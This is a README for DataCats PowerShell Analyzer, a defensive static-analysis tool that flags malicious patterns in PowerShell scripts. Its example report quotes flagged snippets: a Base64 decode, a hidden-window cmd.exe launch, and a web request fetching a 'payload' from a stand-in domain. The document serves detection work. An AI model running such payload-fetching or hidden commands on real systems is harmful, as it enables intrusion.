# DataCats-PowerShell-Analyzer
🐾 PowerShell Incident Response Analyzer - DataCats™ Edition

A security tool designed to analyze PowerShell scripts for potentially malicious elements, suspicious patterns, and security vulnerabilities.

## Overview

DataCats PowerShell Analyzer is a specialized security tool that helps security professionals, system administrators, and developers identify potentially harmful code in PowerShell scripts. By scanning for known malicious patterns, obfuscation techniques, and security vulnerabilities, this tool provides an additional layer of defense against PowerShell-based attacks.

## Features

- **Static Analysis**: Examines PowerShell scripts without execution to identify suspicious code patterns
- **Obfuscation Detection**: Identifies common obfuscation techniques used to hide malicious code
- **Known Exploit Detection**: Checks for patterns associated with common PowerShell-based exploits
- **Command & Function Analysis**: Analyzes commands and functions for potentially dangerous operations
- **Report Generation**: Creates detailed reports of findings with severity levels and explanations
- **Batch Processing**: Ability to scan multiple files or entire directories at once

## Installation

```
git clone https://github.com/datacats-v3xx/DataCats-PowerShell-Analyzer.git
cd DataCats-PowerShell-Analyzer
# Additional installation steps if required
```

## Requirements

- PowerShell 5.1 or higher
- .NET Framework 4.7.2 or higher
- Windows 7/Server 2012 R2 or newer operating systems

## Usage

### Basic Usage

```powershell
.\Analyze-Script.ps1 -Path "C:\path\to\script.ps1"
```

### Advanced Options

```powershell
.\Analyze-Script.ps1 -Path "C:\Scripts" -Recursive -OutputFormat JSON -Severity High -ExcludeThirdParty
```

### Parameters

- `-Path`: Path to a PowerShell script or directory containing scripts
- `-Recursive`: Process subdirectories when scanning a directory
- `-OutputFormat`: Format for results (Text, CSV, JSON, HTML)
- `-OutputPath`: Path where the report will be saved
- `-Severity`: Filter results by minimum severity (Low, Medium, High, Critical)
- `-ExcludeThirdParty`: Skip analysis of recognized third-party modules

## Detection Capabilities

The analyzer can identify various suspicious patterns, including:

- Encoded commands (Base64, compressed scripts)
- Web requests to suspicious domains
- Unusual system modifications
- Privilege escalation attempts
- Credential harvesting techniques
- Common PowerShell attack frameworks patterns
- Suspicious process creation
- Registry modifications
- Evasion techniques

## Example Report

```
Analysis Report for: suspicious_script.ps1
Timestamp: 2025-02-28 14:30:25

CRITICAL: Base64 encoded command detected at line 15
    Details: Possible attempt to hide malicious payload
    Code: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("..."))
    
HIGH: Unusual process creation detected at line 23
    Details: Script appears to create process with hidden window
    Code: Start-Process -WindowStyle Hidden -FilePath cmd.exe -ArgumentList "/c..."
    
MEDIUM: Web request to uncommon domain at line 7
    Details: Connection to potentially suspicious endpoint
    Code: Invoke-WebRequest -Uri "http://unusual-domain.com/payload"
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

This tool is meant for defensive security purposes only. The creators are not responsible for any misuse or damage caused by this tool. Always ensure you have proper authorization before analyzing any PowerShell scripts.

## Contact

- Project Link: [https://github.com/datacats-v3xx/DataCats-PowerShell-Analyzer](https://github.com/datacats-v3xx/DataCats-PowerShell-Analyzer)
- Creator: DataCats (@datacats-v3xx)
